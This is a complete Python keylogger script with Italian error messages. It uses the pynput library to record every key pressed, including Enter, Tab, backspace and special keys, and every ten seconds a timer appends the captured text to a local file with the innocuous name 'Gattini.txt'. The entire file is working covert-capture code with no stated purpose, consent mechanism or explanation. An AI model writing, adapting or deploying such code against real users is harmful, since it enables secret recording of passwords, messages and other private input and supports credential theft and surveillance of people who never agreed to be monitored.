from pynput import keyboard
import threading


gattini_file = "Gattini.txt"


text = ""
previous_text = ""


time_interval = 10


def save_to_file():
    global text, previous_text
    try:
        if text:  
            
            if text != previous_text:
                
                if text.isalpha():
                    text_to_save = text + "-"
                else:
                    text_to_save = text
               
                with open(gattini_file, "a") as f:
                    f.write(text_to_save + "\n")  
                
                previous_text = text
        
        timer = threading.Timer(time_interval, save_to_file)
        timer.start()
    except Exception as e:
        print(f"Errore durante il salvataggio: {e}")


def on_press(key):
    global text
    try:
       
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            if len(text) > 0:
                text = text[:-1]
        else:
       
            text += key.char
    except AttributeError:

        text += f"[{key}]"


with keyboard.Listener(on_press=on_press) as listener:

    save_to_file()
    listener.join()


